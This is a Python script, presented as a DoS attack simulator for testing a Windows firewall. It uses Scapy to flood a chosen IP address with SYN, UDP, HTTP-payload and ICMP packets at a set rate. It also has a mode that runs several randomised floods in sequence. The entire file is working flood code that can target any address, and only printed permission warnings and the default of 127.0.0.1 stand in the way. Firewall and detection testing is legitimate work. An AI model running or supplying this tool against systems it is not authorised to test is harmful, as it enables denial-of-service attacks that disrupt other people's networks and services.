import argparse
import random
import socket
import time
import threading
import sys
from datetime import datetime
from scapy.all import send, IP, TCP, UDP, ICMP, RandShort, Raw

class DoSAttackSimulator:
    def __init__(self, target_ip, attack_type=None, duration=60, intensity=100, port=None):
        """
        Initialize the DoS Attack Simulator
        
        Args:
            target_ip: Target IP address (use 127.0.0.1 to test local firewall)
            attack_type: Type of attack to simulate (syn, udp, http, icmp)
            duration: Duration of attack in seconds
            intensity: Packets per second to send
            port: Target port (default: random based on attack type)
        """
        self.target_ip = target_ip
        self.attack_type = attack_type or random.choice(['syn', 'udp', 'http', 'icmp'])
        self.duration = duration
        self.intensity = intensity
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': None,
            'end_time': None
        }
        
        # Set default port based on attack type if not specified
        if port:
            self.port = port
        else:
            if self.attack_type == 'http':
                self.port = random.choice([80, 443])
            elif self.attack_type == 'syn':
                self.port = random.choice([80, 443, 8080, 22])
            elif self.attack_type == 'udp':
                self.port = random.choice([53, 123, 161, 1900])
            else:  # ICMP doesn't use ports
                self.port = None
                
        # For displaying attack progress
        self.progress_thread = None
        
    def start_attack(self):
        """Start the DoS attack simulation"""
        print(f"\n[+] Starting {self.attack_type.upper()} attack simulation against {self.target_ip}")
        print(f"[+] Duration: {self.duration} seconds")
        print(f"[+] Intensity: {self.intensity} packets per second")
        if self.port:
            print(f"[+] Target port: {self.port}")
        print(f"[+] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("\n[!] WARNING: This is a test tool. Use only on systems you own or have permission to test.")
        print("[!] Press Ctrl+C to stop the attack at any time.")
        
        # Reset stats
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': time.time(),
            'end_time': None
        }
        
        # Start progress display thread
        self.running = True
        self.progress_thread = threading.Thread(target=self._display_progress)
        self.progress_thread.daemon = True
        self.progress_thread.start()
        
        # Choose attack method based on type
        attack_methods = {
            'syn': self._syn_flood_attack,
            'udp': self._udp_flood_attack,
            'http': self._http_flood_attack,
            'icmp': self._icmp_flood_attack
        }
        
        # Get the appropriate attack method
        attack_method = attack_methods.get(self.attack_type.lower())
        if not attack_method:
            print(f"[!] Unknown attack type: {self.attack_type}")
            return
            
        try:
            # Execute the attack
            attack_method()
        except KeyboardInterrupt:
            print("\n[+] Attack stopped by user")
        except Exception as e:
            print(f"\n[!] Error during attack: {e}")
        finally:
            # Record end time and display summary
            self.running = False
            self.stats['end_time'] = time.time()
            
            # Wait for progress thread to finish
            if self.progress_thread:
                self.progress_thread.join(timeout=1)
                
            # Display attack summary
            self._display_summary()
            
    def _syn_flood_attack(self):
        """Perform SYN flood attack"""
        end_time = time.time() + self.duration
        
        while time.time() < end_time and self.running:
            # Calculate delay to maintain intensity
            start_batch = time.time()
            batch_size = min(self.intensity // 10, 100)  # Send in smaller batches
            
            for _ in range(batch_size):
                # Create SYN packet (TCP packet with SYN flag set)
                packet = IP(dst=self.target_ip)/TCP(
                    sport=RandShort(),
                    dport=self.port,
                    flags="S"
                )
                
                # Send the packet
                send(packet, verbose=0)
                
                # Update stats
                packet_size = len(packet)
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += packet_size
            
            # Calculate sleep time to maintain intensity
            elapsed = time.time() - start_batch
            sleep_time = (1.0 / (self.intensity / batch_size)) - elapsed
            if sleep_time > 0:
                time.sleep(sleep_time)
                
    def _udp_flood_attack(self):
        """Perform UDP flood attack"""
        end_time = time.time() + self.duration
        
        while time.time() < end_time and self.running:
            # Calculate delay to maintain intensity
            start_batch = time.time()
            batch_size = min(self.intensity // 10, 100)  # Send in smaller batches
            
            for _ in range(batch_size):
                # Create random payload
                payload = Raw(b"X" * random.randint(64, 1024))
                
                # Create UDP packet with random source port
                packet = IP(dst=self.target_ip)/UDP(
                    sport=RandShort(),
                    dport=self.port
                )/payload
                
                # Send the packet
                send(packet, verbose=0)
                
                # Update stats
                packet_size = len(packet)
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += packet_size
            
            # Calculate sleep time to maintain intensity
            elapsed = time.time() - start_batch
            sleep_time = (1.0 / (self.intensity / batch_size)) - elapsed
            if sleep_time > 0:
                time.sleep(sleep_time)
                
    def _http_flood_attack(self):
        """Perform HTTP flood attack"""
        end_time = time.time() + self.duration
        
        # HTTP request templates
        http_requests = [
            b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            b"POST /login HTTP/1.1\r\nHost: target\r\nContent-Length: 15\r\n\r\nuser=test&pw=test",
            b"GET /api/data HTTP/1.1\r\nHost: target\r\nAccept: application/json\r\n\r\n"
        ]
        
        while time.time() < end_time and self.running:
            # Calculate delay to maintain intensity
            start_batch = time.time()
            batch_size = min(self.intensity // 10, 100)  # Send in smaller batches
            
            for _ in range(batch_size):
                # Choose random HTTP request
                http_request = random.choice(http_requests)
                
                # Create TCP packet with HTTP payload
                packet = IP(dst=self.target_ip)/TCP(
                    sport=RandShort(),
                    dport=self.port,
                    flags="PA"  # PSH, ACK flags
                )/Raw(http_request)
                
                # Send the packet
                send(packet, verbose=0)
                
                # Update stats
                packet_size = len(packet)
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += packet_size
            
            # Calculate sleep time to maintain intensity
            elapsed = time.time() - start_batch
            sleep_time = (1.0 / (self.intensity / batch_size)) - elapsed
            if sleep_time > 0:
                time.sleep(sleep_time)
                
    def _icmp_flood_attack(self):
        """Perform ICMP (ping) flood attack"""
        end_time = time.time() + self.duration
        
        while time.time() < end_time and self.running:
            # Calculate delay to maintain intensity
            start_batch = time.time()
            batch_size = min(self.intensity // 10, 100)  # Send in smaller batches
            
            for _ in range(batch_size):
                # Create ICMP echo request (ping) packet
                packet = IP(dst=self.target_ip)/ICMP(
                    type=8,  # Echo request
                    id=random.randint(1, 65535),
                    seq=random.randint(1, 65535)
                )/Raw(b"X" * random.randint(56, 1024))
                
                # Send the packet
                send(packet, verbose=0)
                
                # Update stats
                packet_size = len(packet)
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += packet_size
            
            # Calculate sleep time to maintain intensity
            elapsed = time.time() - start_batch
            sleep_time = (1.0 / (self.intensity / batch_size)) - elapsed
            if sleep_time > 0:
                time.sleep(sleep_time)
                
    def _display_progress(self):
        """Display attack progress"""
        start_time = time.time()
        
        while self.running:
            elapsed = time.time() - start_time
            if elapsed > 0 and self.duration > 0:
                progress = min(elapsed / self.duration, 1.0)
                
                # Create progress bar
                bar_length = 30
                filled_length = int(bar_length * progress)
                bar = '█' * filled_length + '-' * (bar_length - filled_length)
                
                # Calculate stats
                remaining = max(0, self.duration - elapsed)
                pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
                mbps = (self.stats['bytes_sent'] * 8 / 1_000_000) / elapsed if elapsed > 0 else 0
                
                # Print progress
                print(f"\r[{bar}] {progress:.1%} | {elapsed:.1f}/{self.duration}s | Sent: {self.stats['packets_sent']} pkts | {pps:.1f} pps | {mbps:.2f} Mbps", end='')
                sys.stdout.flush()
            
            # Update every 0.5 seconds
            time.sleep(0.5)
    
    def _display_summary(self):
        """Display attack summary"""
        if not self.stats['end_time']:
            self.stats['end_time'] = time.time()
            
        elapsed = self.stats['end_time'] - self.stats['start_time']
        
        print("\n\n===== Attack Summary =====")
        print(f"Attack type: {self.attack_type.upper()}")
        print(f"Target: {self.target_ip}" + (f":{self.port}" if self.port else ""))
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Packets sent: {self.stats['packets_sent']}")
        print(f"Data sent: {self.stats['bytes_sent'] / 1_000_000:.2f} MB")
        print(f"Rate: {self.stats['packets_sent'] / elapsed:.2f} packets/second")
        print(f"Bandwidth: {(self.stats['bytes_sent'] * 8 / 1_000_000) / elapsed:.2f} Mbps")
        print("=========================")
        
        print("\n[i] Check your DoS detection firewall to verify if the attack was detected.")
        
        
def multiattack(target_ip, duration, count):
    """Run multiple different attacks in sequence"""
    attack_types = ['syn', 'udp', 'http', 'icmp']
    
    for i in range(count):
        # Choose random attack type for each attack
        attack_type = random.choice(attack_types)
        
        # Vary intensity to simulate different attack patterns
        intensity = random.randint(50, 500)
        
        # Show divider between attacks
        if i > 0:
            print("\n" + "=" * 60 + "\n")
            
        print(f"Running attack {i+1}/{count}: {attack_type.upper()}")
        
        # Create and start the attack
        simulator = DoSAttackSimulator(
            target_ip=target_ip,
            attack_type=attack_type,
            duration=duration,
            intensity=intensity
        )
        simulator.start_attack()


def main():
    """Main function"""
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='DoS Attack Simulator for Testing Windows Firewall')
    
    parser.add_argument('target', nargs='?', default='127.0.0.1',
                      help='Target IP address (default: 127.0.0.1)')
    
    parser.add_argument('-t', '--type', choices=['syn', 'udp', 'http', 'icmp', 'multi'],
                      help='Attack type (default: random)')
    
    parser.add_argument('-d', '--duration', type=int, default=30,
                      help='Attack duration in seconds (default: 30)')
    
    parser.add_argument('-i', '--intensity', type=int, default=100,
                      help='Attack intensity in packets per second (default: 100)')
    
    parser.add_argument('-p', '--port', type=int,
                      help='Target port (default: based on attack type)')
    
    parser.add_argument('-c', '--count', type=int, default=3,
                      help='Number of attacks to run in multi mode (default: 3)')
    
    args = parser.parse_args()
    
    # Print banner
    print("\n" + "=" * 60)
    print("DoS Attack Simulator for Testing Windows Firewall")
    print("=" * 60)
    print("\nWARNING: This tool is for testing and educational purposes only!")
    print("Using this tool against systems without permission is illegal.")
    
    # Check if Scapy is installed
    try:
        from scapy.all import IP
    except ImportError:
        print("\nError: Scapy is not installed. Please install it with:")
        print("pip install scapy")
        return
    
    try:
        # Run multi-attack mode if selected
        if args.type == 'multi':
            multiattack(args.target, args.duration, args.count)
        else:
            # Create and start the attack simulator
            simulator = DoSAttackSimulator(
                target_ip=args.target,
                attack_type=args.type,
                duration=args.duration,
                intensity=args.intensity,
                port=args.port
            )
            simulator.start_attack()
            
    except KeyboardInterrupt:
        print("\n\nAttack stopped by user")
    except Exception as e:
        print(f"\nError: {e}")


if __name__ == "__main__":
    main()